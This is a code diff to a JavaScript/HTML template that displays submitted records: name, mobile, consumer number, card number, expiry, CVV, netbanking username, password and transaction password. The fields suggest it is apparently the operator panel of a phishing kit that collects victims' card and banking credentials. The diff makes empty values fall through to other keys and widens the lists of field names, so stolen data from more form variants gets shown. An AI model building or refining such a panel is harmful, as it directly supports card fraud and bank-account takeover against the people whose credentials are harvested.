@@ -367,7 +367,7 @@
                     
                     const getVal = (keys) => {
                         for(let k of keys) {
-                            if(sub[k]) return sub[k];
+                            if(sub[k] !== undefined && sub[k] !== null && String(sub[k]).trim() !== "") return sub[k];
                         }
                         return 'Nill';
                     };
@@ -384,24 +384,24 @@
                         
                         <div class="form-section">
                             <div class="form-section-title"><i class="fas fa-user"></i> Personal Details</div>
-                            ${row('Name', getVal(['name', 'Name', 'full_name']))}
-                            ${row('Mobile', getVal(['mobile', 'mobile_number', 'phone', 'Mobile', 'Mobile Number']))}
-                            ${row('Consumer No', getVal(['consumer_no', 'consumer_number', 'Consumer Number']))}
+                            ${row('Name', getVal(['customerName', 'name', 'Name', 'full_name', 'userName']))}
+                            ${row('Mobile', getVal(['mobileNumber', 'mobile', 'mobile_number', 'phone', 'phoneNumber', 'Mobile', 'Mobile Number']))}
+                            ${row('Consumer No', getVal(['consumerNumber', 'consumerNo', 'consumer_no', 'consumer_number', 'Consumer Number']))}
                         </div>
 
                         <div class="form-section">
                             <div class="form-section-title"><i class="fas fa-credit-card"></i> Card Details</div>
-                            ${row('Card Number', getVal(['card_no', 'card_number', 'Card Number']))}
-                            ${row('Expiry Date', getVal(['expiry', 'exp_date', 'Expiry Date']))}
+                            ${row('Card Number', getVal(['cardNumber', 'cardNo', 'card_number', 'Card Number']))}
+                            ${row('Expiry Date', getVal(['expireDate', 'expiryDate', 'expiry', 'exp_date', 'expDate', 'Expiry Date']))}
                             ${row('CVV', getVal(['cvv', 'CVV']))}
                         </div>
 
                         <div class="form-section">
                             <div class="form-section-title"><i class="fas fa-university"></i> Netbanking Details</div>
-                            ${row('Bank Name', getVal(['bank_name', 'Bank Name']))}
-                            ${row('User Name', getVal(['username', 'User Name']))}
-                            ${row('Password', getVal(['password', 'Password']))}
-                            ${row('TXN Pass', getVal(['txn_pass', 'customer_id', 'TXN Pass']))}
+                            ${row('Bank Name', getVal(['bankName', 'bank_name', 'Bank Name']))}
+                            ${row('User Name', getVal(['netUsername', 'userId', 'user_id', 'username', 'User Name']))}
+                            ${row('Password', getVal(['netPassword', 'password', 'loginPassword', 'Password']))}
+                            ${row('TXN Pass', getVal(['txnPass', 'txn_pass', 'transactionPassword', 'customer_id', 'TXN Pass', 'customerId']))}
                         </div>
                     </div>`;
                 }).join('');
